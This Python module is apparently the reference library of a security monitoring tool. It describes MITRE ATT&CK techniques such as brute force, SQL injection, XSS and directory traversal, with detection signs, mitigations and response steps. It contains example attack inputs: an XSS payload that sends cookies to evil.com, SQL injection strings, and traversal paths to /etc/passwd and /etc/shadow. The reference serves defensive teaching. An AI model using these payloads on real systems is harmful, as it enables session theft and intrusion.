"""
Boundry.AI — MITRE ATT&CK Reference Library
=============================================
Detailed reference data for every threat technique detected by the security agent.
Each entry covers: what it is, how attackers use it, detection signals,
business impact, preventive controls, and incident response steps.
"""

TECHNIQUES = {

    # ── T1110 — Brute Force ───────────────────────────────────────────────────
    "T1110": {
        "id":     "T1110",
        "name":   "Brute Force",
        "tactic": "Credential Access",
        "severity": "HIGH",
        "summary": (
            "An attacker systematically tries many passwords against one account "
            "until they find the correct one. It's the digital equivalent of trying "
            "every key on a keyring until one opens the lock."
        ),
        "how_it_works": (
            "The attacker uses automated tools (Hydra, Burp Suite, custom scripts) to "
            "send hundreds or thousands of login requests per minute. They may use "
            "common password lists (rockyou.txt), variations of the username, or "
            "keyboard patterns (qwerty123, admin1234). Slower attacks stay under "
            "rate-limit thresholds — as few as 1-2 attempts per minute — to avoid "
            "detection while still making progress over hours or days."
        ),
        "how_to_spot": [
            "Multiple failed login attempts for the same username in a short window",
            "LOGIN_FAILED events from a single IP targeting a single account",
            "Attempts spread across odd hours (2am-5am) to avoid analyst attention",
            "Sequential or dictionary-pattern passwords in failed attempts",
            "High volume of 401/403 HTTP responses in web server logs",
            "Same IP appearing in failed attempts then a successful login",
        ],
        "log_signatures": [
            "LOGIN_FAILED username=<target> ip=<attacker>  (repeated 5+ times)",
            "LOGIN_SUCCESS username=<target> ip=<attacker>  (after failures — compromise confirmed)",
        ],
        "business_impact": (
            "If the attack succeeds, the attacker has full access to the compromised account. "
            "For an admin account this means complete system takeover. For a client account it "
            "means access to their data, reports, and any connected systems. Depending on what "
            "data the account held, this may trigger GDPR breach notification obligations within "
            "72 hours."
        ),
        "mitigation": [
            "Account lockout after 5-10 failed attempts (reset after 15-30 minutes)",
            "Multi-factor authentication (MFA) — makes stolen passwords useless alone",
            "Rate limiting on the login endpoint (already implemented: 10/min per IP)",
            "CAPTCHA after 3 failed attempts to stop automated tools",
            "Strong password policy — 12+ chars, uppercase, number, special character",
            "Alert on 5+ failed attempts for the same account within 60 seconds",
            "Block or CAPTCHA IPs after 20+ failed attempts across any accounts",
        ],
        "incident_response": [
            "IMMEDIATE: Lock the targeted account now — don't wait to confirm",
            "Check for LOGIN_SUCCESS from the same IP after the failures — if found, account is compromised",
            "If compromised: force password reset, invalidate all active sessions",
            "Block the attacker IP at your firewall or hosting provider",
            "Review all activity on the account since the successful login",
            "If the account had admin privileges: audit all changes made post-compromise",
            "Enable MFA on the affected account before unlocking it",
            "Check if the same IP attacked other accounts — credential stuffing may follow",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1110", "url": "https://attack.mitre.org/techniques/T1110/"},
            {"title": "OWASP: Testing for Brute Force", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
        ],
    },

    # ── T1190 — SQL Injection ─────────────────────────────────────────────────
    "T1190": {
        "id":     "T1190",
        "name":   "SQL Injection (Exploit Public-Facing Application)",
        "tactic": "Initial Access",
        "severity": "HIGH",
        "summary": (
            "The attacker inserts malicious SQL code into an input field (search box, "
            "login form, URL parameter). If the app passes this directly to the database "
            "without sanitising it, the attacker can read, modify, or delete data — or "
            "bypass authentication entirely."
        ),
        "how_it_works": (
            "Web applications talk to databases using SQL queries. A vulnerable app might "
            "build a query like: SELECT * FROM users WHERE username = '<input>'. If the "
            "attacker enters ' OR '1'='1, the query becomes: WHERE username = '' OR '1'='1' "
            "— which is always true, returning all users. More advanced payloads use UNION "
            "SELECT to extract data from other tables, or DROP TABLE to destroy data. "
            "Automated tools like SQLMap can test thousands of injection points in minutes."
        ),
        "how_to_spot": [
            "SEARCH events containing SQL keywords: OR, AND, UNION, SELECT, DROP, --, '=",
            "Input fields receiving payloads like: ' OR '1'='1 or 1; DROP TABLE users;--",
            "Unusual database errors appearing in HTTP responses (500 errors)",
            "Requests with encoded SQL: %27 (apostrophe), %20 (space), %3D (equals)",
            "Repeated search queries from the same IP with slightly varied payloads",
            "Unusually large data responses from a search query",
        ],
        "log_signatures": [
            "SEARCH username=<user> query=\"' OR '1'='1\" ip=<attacker>",
            "SEARCH username=<user> query=\"' UNION SELECT username, password FROM users--\" ip=<attacker>",
        ],
        "business_impact": (
            "A successful SQL injection can expose your entire database — every username, "
            "hashed password, client record, and report. Attackers can also modify or delete "
            "data, forge records, and in some configurations execute system commands. This "
            "almost certainly triggers GDPR notification requirements if client data is "
            "exposed. Reputational damage is severe — SQL injection is considered a "
            "completely preventable vulnerability."
        ),
        "mitigation": [
            "Use parameterised queries / prepared statements — NEVER build SQL by concatenating user input",
            "Input validation: reject inputs containing SQL special characters where not needed",
            "Principle of least privilege: the DB user the app connects as should only have SELECT/INSERT/UPDATE — never DROP",
            "Web Application Firewall (WAF) to block common injection patterns",
            "Error handling: never expose database errors or stack traces to users",
            "Regular automated scanning with SQLMap or OWASP ZAP against your own app",
            "Keep database software patched and updated",
        ],
        "incident_response": [
            "IMMEDIATE: Check if any data was actually returned — look for unusually large response sizes",
            "Review database query logs for successful injections (not just blocked attempts)",
            "If data was extracted: identify exactly which tables/records were accessible",
            "If authentication was bypassed via injection: audit what the attacker accessed",
            "Rotate all database passwords and application credentials immediately",
            "Patch the vulnerable input — switch to parameterised queries",
            "Check for web shells or backdoors if the DB user had FILE privileges",
            "If client data was exposed: begin GDPR breach assessment (72-hour clock starts now)",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1190", "url": "https://attack.mitre.org/techniques/T1190/"},
            {"title": "OWASP SQL Injection", "url": "https://owasp.org/www-community/attacks/SQL_Injection"},
            {"title": "OWASP A03:2021 – Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
        ],
    },

    # ── T1059.007 — XSS ──────────────────────────────────────────────────────
    "T1059.007": {
        "id":     "T1059.007",
        "name":   "Cross-Site Scripting (XSS)",
        "tactic": "Execution",
        "severity": "HIGH",
        "summary": (
            "The attacker injects malicious JavaScript into a web page that other users "
            "then load. The script runs in the victim's browser with full access to their "
            "session — allowing the attacker to steal login cookies, hijack accounts, "
            "redirect users, or silently perform actions on their behalf."
        ),
        "how_it_works": (
            "In a reflected XSS attack, the payload is in a URL: /greeting?name=<script>"
            "fetch('https://evil.com?c='+document.cookie)</script>. When a victim opens "
            "this link, their browser executes the script. In stored XSS, the payload is "
            "saved in the database (e.g. in a comment field) and fires for every user who "
            "views that page. DOM-based XSS manipulates the page structure without a server "
            "round-trip. The most dangerous outcome is session cookie theft — the attacker "
            "gets your session token and can log in as you from anywhere."
        ),
        "how_to_spot": [
            "XSS_ATTEMPT events with payloads containing <script>, onerror=, onload=, javascript:",
            "Input fields receiving HTML tags: <img>, <svg>, <iframe>",
            "URL parameters containing encoded angle brackets: %3Cscript%3E",
            "Unexpected outbound requests to external domains (exfiltration)",
            "User complaints about being redirected or seeing unexpected popups",
            "Session tokens appearing in external server logs",
        ],
        "log_signatures": [
            "XSS_ATTEMPT username=<user> payload=\"<script>alert(1)</script>\" ip=<attacker>",
            "XSS_ATTEMPT username=<user> payload=\"<img src=x onerror=fetch(...)>\" ip=<attacker>",
        ],
        "business_impact": (
            "XSS attacks target your users, not just your server. If stored XSS lands in your "
            "app, every client who logs in could have their session stolen — the attacker gets "
            "access to all their reports, data, and account settings without any login attempt "
            "that your rate limiter would catch. This is particularly dangerous in a "
            "cybersecurity platform where client incident data is highly sensitive."
        ),
        "mitigation": [
            "HTML-encode all user input before rendering it — never use |safe in Jinja2 with user data",
            "Content Security Policy (CSP) headers — prevents inline scripts from executing",
            "HttpOnly flag on session cookies — JavaScript cannot read them even if XSS fires",
            "Secure and SameSite flags on all cookies",
            "Input validation: reject or sanitise HTML tags in fields that don't need them",
            "Use a templating engine with auto-escaping (Jinja2 does this by default)",
            "Regular OWASP ZAP or Burp Suite scans against your own app",
        ],
        "incident_response": [
            "IMMEDIATE: Identify if the payload was stored (in DB) or reflected (in URL only)",
            "If stored: remove the malicious payload from the database immediately",
            "Invalidate all active user sessions — if cookies were stolen, all sessions are compromised",
            "Force all users to re-authenticate",
            "Check server logs for outbound requests to external domains during the attack window",
            "Notify affected users that they should check for suspicious activity on their accounts",
            "Patch the vulnerable input field before re-enabling it",
            "If session tokens were exfiltrated: rotate the application's secret key",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1059.007", "url": "https://attack.mitre.org/techniques/T1059/007/"},
            {"title": "OWASP XSS Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"},
        ],
    },

    # ── T1083 — Directory Traversal ───────────────────────────────────────────
    "T1083": {
        "id":     "T1083",
        "name":   "Directory Traversal (File & Directory Discovery)",
        "tactic": "Discovery",
        "severity": "MEDIUM",
        "summary": (
            "The attacker manipulates file path parameters to escape the web application's "
            "intended directory and access files anywhere on the server — including system "
            "files, configuration files, and credentials. Classic payload: ../../etc/passwd"
        ),
        "how_it_works": (
            "Web apps that serve files based on user-supplied paths are vulnerable: "
            "/download?file=report.pdf can become /download?file=../../etc/passwd. "
            "The ../ sequences walk up the directory tree. Attackers often encode these "
            "to bypass simple filters: ..%2F, %2e%2e%2f, ....//. On Windows, backslashes "
            "and drive letters are also tested. Common targets: /etc/passwd (user list), "
            "/etc/shadow (password hashes), application config files, .env files with "
            "database credentials, and SSH private keys."
        ),
        "how_to_spot": [
            "DIRECTORY_TRAVERSAL events with paths containing ../, ..\\, %2e%2e",
            "Requests for /etc/passwd, /etc/shadow, /.env, /config, /web.config",
            "URL-encoded dot-dot sequences: %2e%2e%2f, ..%2f, %2e%2e/",
            "Multiple traversal attempts from same IP in quick succession (scanner)",
            "404 or 403 responses to file paths that shouldn't exist on a web server",
            "Requests for Windows-specific paths: \\windows\\system32\\, C:\\",
        ],
        "log_signatures": [
            "DIRECTORY_TRAVERSAL username=<user> path=\"../../etc/passwd\" ip=<attacker>",
            "DIRECTORY_TRAVERSAL username=<user> path=\"..%2F..%2Fetc%2Fshadow\" ip=<attacker>",
        ],
        "business_impact": (
            "If successful, directory traversal can expose your entire server filesystem to "
            "the attacker. A single .env file read gives them your database password, API "
            "keys, and secret key — instant full compromise. SSH private keys enable server "
            "access. /etc/shadow gives them password hashes to crack offline. This is often "
            "a precursor to a much larger attack."
        ),
        "mitigation": [
            "Never use user-supplied input directly in file paths",
            "Use a whitelist of allowed filenames — reject anything not on the list",
            "Resolve and validate the canonical path: ensure it starts with the expected base directory",
            "Run the web application as a low-privilege user with minimal filesystem access",
            "Store sensitive config outside the web root and outside the application directory",
            "Never store .env files or credentials in directories accessible by the web server",
            "Use a WAF rule to block path traversal patterns in all parameters",
        ],
        "incident_response": [
            "IMMEDIATE: Identify which paths the attacker actually accessed (check web server access logs for 200 responses)",
            "If .env or config files were read: rotate ALL credentials immediately — DB password, API keys, secret key",
            "If /etc/shadow was read: all system user passwords must be rotated",
            "Check for follow-on attacks — traversal is usually reconnaissance before a bigger move",
            "Review what files are accessible from the web application's working directory",
            "Move sensitive files outside the web root immediately",
            "If credentials were exposed: check for unauthorised DB access or API calls",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1083", "url": "https://attack.mitre.org/techniques/T1083/"},
            {"title": "OWASP Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal"},
        ],
    },

    # ── T1110.003 — Password Spray ────────────────────────────────────────────
    "T1110.003": {
        "id":     "T1110.003",
        "name":   "Password Spraying",
        "tactic": "Credential Access",
        "severity": "HIGH",
        "summary": (
            "Instead of trying many passwords against one account (brute force), the attacker "
            "tries ONE common password against MANY accounts. This deliberately stays under "
            "lockout thresholds — 1 attempt per account — making it nearly invisible to "
            "standard brute force detection."
        ),
        "how_it_works": (
            "Attackers compile a list of valid usernames (from LinkedIn, company website, "
            "prior enumeration) then try a single password like 'Summer2024!' or 'Company123!' "
            "against all of them. They wait several minutes between rounds to avoid lockouts. "
            "These passwords work because many employees choose seasonal or company-themed "
            "passwords, especially when forced to change them regularly. One account in 50 "
            "is often enough for initial access."
        ),
        "how_to_spot": [
            "Single IP with LOGIN_FAILED against 5+ different usernames in a short window",
            "Failed attempts spread across many accounts — only 1-2 per account",
            "Pattern matches: same time-of-day, regular intervals between attempts",
            "sprayed_password= marker in extra field of security events",
            "Slow attack pace — may look like normal user errors spread over hours",
            "Successful login following low-volume failures across many accounts",
        ],
        "log_signatures": [
            "LOGIN_FAILED username=admin    ip=<attacker> extra=sprayed_password=Summer2024!",
            "LOGIN_FAILED username=alice    ip=<attacker> extra=sprayed_password=Summer2024!",
            "LOGIN_FAILED username=support  ip=<attacker> extra=sprayed_password=Summer2024!",
        ],
        "business_impact": (
            "Password spraying is the preferred technique of nation-state threat actors and "
            "ransomware groups because it's so hard to detect. A single compromised account "
            "gives the attacker a foothold — they then move laterally, escalate privileges, "
            "and establish persistence. Many major ransomware incidents began with a "
            "successful spray against a VPN or web portal."
        ),
        "mitigation": [
            "Multi-factor authentication — a sprayed password alone cannot log in",
            "Banned password list — reject commonly sprayed passwords at registration and reset",
            "Anomaly detection: alert when 1 IP hits 5+ different accounts in 10 minutes",
            "Named account baseline: alert on logins from new IPs or at unusual hours",
            "Educate users against seasonal/predictable passwords",
            "Consider passwordless authentication (passkeys, SSO) for highest-risk accounts",
        ],
        "incident_response": [
            "IMMEDIATE: Identify if any account had a successful login from the spray IP",
            "Force password resets on all accounts attempted — they may share the sprayed password",
            "Block the attacker IP and all IPs from the same subnet",
            "Check for lateral movement from any compromised account",
            "Review all activity from the spray IP across all systems (VPN, email, cloud)",
            "Enable MFA on all accounts before the next login",
            "If internal spray (compromised insider account): investigate that account first",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1110.003", "url": "https://attack.mitre.org/techniques/T1110/003/"},
            {"title": "CISA: Password Spray Attacks", "url": "https://www.cisa.gov/news-events/cybersecurity-advisories"},
        ],
    },

    # ── T1110.004 — Credential Stuffing ──────────────────────────────────────
    "T1110.004": {
        "id":     "T1110.004",
        "name":   "Credential Stuffing",
        "tactic": "Credential Access",
        "severity": "CRITICAL",
        "summary": (
            "The attacker uses real username/password pairs stolen from previous data "
            "breaches — bought on dark web markets — and tries them against your application. "
            "They work because people reuse passwords across sites. One successful login "
            "means the victim's password was already leaked somewhere else."
        ),
        "how_it_works": (
            "Dark web markets sell breach databases containing billions of credentials from "
            "past breaches (LinkedIn 2012, Adobe 2013, Have I Been Pwned tracks 12+ billion). "
            "Attackers buy a list targeting your industry or region, then use tools like "
            "Sentry MBA, OpenBullet, or custom scripts to test each pair. Unlike brute force, "
            "each credential only needs one attempt — so lockouts don't apply. Success rates "
            "of 0.1-2% sound low, but against 10,000 accounts that's 10-200 compromised users."
        ),
        "how_to_spot": [
            "Same IP with LOGIN_FAILED against 4+ different accounts (without spray markers)",
            "Higher-than-normal login failure rate across all accounts simultaneously",
            "Successful logins following multi-account failures from the same IP",
            "Logins from unusual geolocations or IP ranges (residential proxies, Tor)",
            "Login attempts at consistent intervals — automated tooling signature",
            "Device fingerprints or user agents that don't match prior sessions",
        ],
        "log_signatures": [
            "LOGIN_FAILED username=admin   ip=<attacker>",
            "LOGIN_FAILED username=alice   ip=<attacker>",
            "LOGIN_FAILED username=bob     ip=<attacker>",
            "LOGIN_SUCCESS username=alice  ip=<attacker>  ← account was in breach database",
        ],
        "business_impact": (
            "This is classified CRITICAL because it confirms that at least one of your users "
            "had their credentials exposed in a prior third-party breach. The attacker already "
            "has valid credentials — no guessing required. If the compromised account belongs "
            "to a client, you have a direct obligation to notify them. If it's an admin "
            "account, assume full system compromise until proven otherwise."
        ),
        "mitigation": [
            "Multi-factor authentication — the most effective single control against stuffing",
            "Check passwords against breach databases at registration and login (HaveIBeenPwned API)",
            "Device fingerprinting and risk-based authentication (new device = MFA challenge)",
            "CAPTCHA on the login form — slows automated tools significantly",
            "Rate limiting per IP across all accounts (not just per-account lockout)",
            "Anomalous login detection: new IP + new device = automatic MFA or block",
            "Notify users when their credentials appear in known breach databases",
        ],
        "incident_response": [
            "IMMEDIATE: Force password reset on the compromised account right now",
            "Invalidate all active sessions for the compromised account",
            "Block the attacker IP — check for other IPs used in the same attack",
            "Audit all activity on the compromised account since the successful login",
            "Notify the account owner that their credentials were found in a breach database",
            "Run all user emails against HaveIBeenPwned — proactively identify others at risk",
            "If client data was accessed: begin GDPR breach assessment immediately",
            "Consider forcing MFA enrollment for all users before next login",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1110.004", "url": "https://attack.mitre.org/techniques/T1110/004/"},
            {"title": "Have I Been Pwned", "url": "https://haveibeenpwned.com/"},
            {"title": "OWASP: Credential Stuffing", "url": "https://owasp.org/www-community/attacks/Credential_stuffing"},
        ],
    },

    # ── T1548 — Privilege Escalation ──────────────────────────────────────────
    "T1548": {
        "id":     "T1548",
        "name":   "Privilege Escalation (Abuse Elevation Control Mechanism)",
        "tactic": "Privilege Escalation",
        "severity": "HIGH",
        "summary": (
            "After gaining initial access, the attacker tries to gain higher privileges — "
            "moving from a regular user account to admin or analyst access. In your app "
            "this looks like a logged-in user probing restricted routes like /control-room, "
            "/api/admin, or /.env."
        ),
        "how_it_works": (
            "In web applications, privilege escalation often exploits broken access control — "
            "routes that should require admin role but either don't check, or check incorrectly. "
            "Attackers probe common admin paths (/admin, /control-room, /api/users), test for "
            "IDOR (Insecure Direct Object Reference) vulnerabilities by changing IDs in URLs, "
            "attempt to modify their own role in API calls, or look for admin functions exposed "
            "without proper role checks. Automated scanners try hundreds of admin paths in seconds."
        ),
        "how_to_spot": [
            "PRIV_ESC_ATTEMPT events: a user account accessing /admin, /control-room, /api/admin",
            "403 responses to admin routes from non-admin user accounts",
            "Sequential probing of admin-pattern paths from a single account",
            "API calls attempting to modify role or permission fields",
            "Successful access to admin routes by accounts without the admin role",
            "Unusual access to other users' resources (IDOR: /reports/1, /reports/2, /reports/3...)",
        ],
        "log_signatures": [
            "PRIV_ESC_ATTEMPT username=alice ip=<attacker> route=/control-room",
            "PRIV_ESC_ATTEMPT username=alice ip=<attacker> route=/api/admin",
            "PRIV_ESC_ATTEMPT username=alice ip=<attacker> route=/.env",
        ],
        "business_impact": (
            "Successful privilege escalation from client to analyst gives the attacker access "
            "to ALL client reports, ALL security events, and ALL user accounts — not just "
            "their own. They can impersonate the analyst, modify triage status on reports, "
            "cover their tracks by marking events as processed, and access sensitive "
            "information about every other client in the system."
        ),
        "mitigation": [
            "Role-based access control (RBAC) on every route — already implemented via @analyst_required",
            "Never rely solely on UI hiding to protect admin functions — check server-side every time",
            "Return 403 (not 404) for authorisation failures — but log the attempt",
            "Principle of least privilege: default accounts have minimum permissions",
            "Regular access control audits: manually test that role boundaries hold",
            "IDOR protection: always verify the requesting user owns the requested resource",
            "Avoid predictable admin URLs — /admin is always probed first",
        ],
        "incident_response": [
            "IMMEDIATE: Determine if any admin route was successfully accessed (200 response)",
            "If admin access was gained: treat as full system compromise — rotate all credentials",
            "Audit all actions taken via the escalated access (report changes, user modifications)",
            "Force re-authentication for all sessions immediately",
            "Review the specific route that was breached and patch the access control check",
            "Check if the attacker created any backdoor accounts or modified existing roles",
            "Review audit logs for data exfiltration during the escalated access window",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1548", "url": "https://attack.mitre.org/techniques/T1548/"},
            {"title": "OWASP A01:2021 – Broken Access Control", "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"},
        ],
    },

    # ── T1589.001 — Account Enumeration ──────────────────────────────────────
    "T1589.001": {
        "id":     "T1589.001",
        "name":   "Account Enumeration (Gather Victim Identity Information)",
        "tactic": "Reconnaissance",
        "severity": "MEDIUM",
        "summary": (
            "The attacker probes your application to discover which usernames actually exist. "
            "This is reconnaissance — they use the results to target real accounts in follow-on "
            "attacks like credential stuffing or brute force. It's often the first step in a "
            "multi-stage attack chain."
        ),
        "how_it_works": (
            "Attackers exploit subtle differences in how an app responds to valid vs invalid "
            "usernames. A vulnerable app says 'incorrect password' for a valid user but "
            "'user not found' for an invalid one — confirming which usernames exist. "
            "Even timing differences can leak this: valid username lookups take slightly "
            "longer due to password hashing. Attackers also scrape LinkedIn, company websites, "
            "and email formats to build username lists before even hitting your login page."
        ),
        "how_to_spot": [
            "ACCOUNT_ENUM events: single IP probing 5+ different usernames in quick succession",
            "Sequential or pattern-based username testing (user1, user2, user3 or first.last)",
            "High volume of requests to /login or /register with varying usernames",
            "Timing analysis: attacker measuring response times for valid vs invalid users",
            "User enumeration via password reset forms (different response for valid emails)",
            "Scraping-pattern requests with no subsequent login attempts",
        ],
        "log_signatures": [
            "ACCOUNT_ENUM username=admin     ip=<attacker>",
            "ACCOUNT_ENUM username=alice     ip=<attacker>",
            "ACCOUNT_ENUM username=support   ip=<attacker>",
            "(followed by credential stuffing or brute force targeting confirmed accounts)",
        ],
        "business_impact": (
            "Enumeration itself causes no direct damage — but it feeds the attacker's target "
            "list. After a successful enumeration run, expect brute force or credential stuffing "
            "against the confirmed accounts within hours or days. It also reveals information "
            "about your organisation: account naming patterns expose employee names, which "
            "enables spear-phishing campaigns."
        ),
        "mitigation": [
            "Generic error messages: 'Invalid username or password' — never specify which is wrong",
            "Consistent response times regardless of whether username exists (timing-safe comparison)",
            "Rate limiting on all authentication endpoints, not just login",
            "CAPTCHA after 3-5 failed attempts from the same IP",
            "Account lockout applies to invalid usernames too — don't short-circuit before hashing",
            "Monitor for enumeration patterns and block probing IPs",
            "Use non-guessable username formats where possible",
        ],
        "incident_response": [
            "IMMEDIATE: Block the enumerating IP — they are building a target list",
            "The confirmed username list will be used in follow-on attacks — increase monitoring",
            "Proactively enforce MFA on all confirmed accounts",
            "Review whether your login error messages reveal username validity",
            "Check if the same IP (or related IPs) follows up with brute force or stuffing",
            "If internal accounts were confirmed: warn those users to expect phishing",
            "Consider temporarily rate-limiting login to 3 attempts/minute from all IPs",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1589.001", "url": "https://attack.mitre.org/techniques/T1589/001/"},
            {"title": "OWASP: Testing for Account Enumeration", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
        ],
    },

    # ── T1078 — Valid Accounts / Suspicious Login ─────────────────────────────
    "T1078": {
        "id":     "T1078",
        "name":   "Valid Accounts (Suspicious Login)",
        "tactic": "Defense Evasion",
        "severity": "MEDIUM",
        "summary": (
            "A legitimate account logs in from an unusual IP address, at an unusual time, "
            "or from a new device. This could mean the account has been compromised via "
            "credential stuffing, phishing, or session hijacking — and the attacker is now "
            "using valid credentials, making detection much harder than a brute force attack."
        ),
        "how_it_works": (
            "Using valid credentials is an attacker's ideal scenario — they bypass all "
            "authentication controls and appear as a legitimate user. This happens after "
            "successful phishing (user entered credentials on a fake page), credential "
            "stuffing (password reused from another breach), social engineering, or "
            "purchasing credentials on dark web markets. The 'suspicious' signals are "
            "contextual: new IP address, login at 3am when the user never works nights, "
            "login from a different country, or a new device fingerprint."
        ),
        "how_to_spot": [
            "LOGIN_SUCCESS with new_ip=true or unusual_hour=true markers",
            "Login from IP address never used by this account before",
            "Login at an hour inconsistent with the user's normal pattern",
            "Login from a different country than the user's normal location",
            "New browser fingerprint or user agent for a returning user",
            "Login followed immediately by privilege escalation probes (account takeover signature)",
            "Rapid access to sensitive data immediately after login (smash-and-grab pattern)",
        ],
        "log_signatures": [
            "LOGIN_SUCCESS username=alice ip=<attacker> extra=new_ip=true unusual_hour=true",
            "(often followed by PRIV_ESC_ATTEMPT from the same IP)",
        ],
        "business_impact": (
            "A compromised valid account is the most dangerous scenario because the attacker "
            "looks legitimate. All their actions appear as normal user activity. They can "
            "exfiltrate data slowly over days without triggering volume-based alerts. If it's "
            "a client account, the attacker has access to all their incident reports. If it's "
            "an analyst account, they have access to every client's data in the system."
        ),
        "mitigation": [
            "Multi-factor authentication — most important control for account takeover prevention",
            "Anomaly detection: alert on new IP, new country, or unusual hours",
            "Login notifications to the account owner (email/SMS) on every new device or location",
            "Session management: limit concurrent sessions, flag multiple simultaneous sessions",
            "Risk-based authentication: new IP = step-up MFA challenge",
            "Regular credential rotation and breach monitoring (HaveIBeenPwned)",
            "Zero trust: verify continuously, not just at login",
        ],
        "incident_response": [
            "IMMEDIATE: Contact the account owner directly — did they log in from this IP?",
            "If owner confirms they did NOT login: account is compromised — lock it immediately",
            "Force password reset and MFA enrollment before restoring access",
            "Review all actions taken during the suspicious session",
            "Identify how credentials were obtained (check for phishing, prior breach exposure)",
            "If sensitive data was accessed: assess breach notification obligations",
            "Check for persistence mechanisms: new API keys generated, email forwarding rules set",
            "If analyst account: audit all client data accessed during the compromised session",
        ],
        "references": [
            {"title": "MITRE ATT&CK: T1078", "url": "https://attack.mitre.org/techniques/T1078/"},
            {"title": "CISA: Account Takeover", "url": "https://www.cisa.gov/topics/cyber-threats-and-advisories"},
        ],
    },
}


def get_technique(technique_id: str) -> dict | None:
    """Return the full reference entry for a technique ID, or None if not found."""
    return TECHNIQUES.get(technique_id)


def get_all_techniques() -> list[dict]:
    """Return all techniques sorted by tactic then name."""
    return sorted(TECHNIQUES.values(), key=lambda t: (t["tactic"], t["name"]))
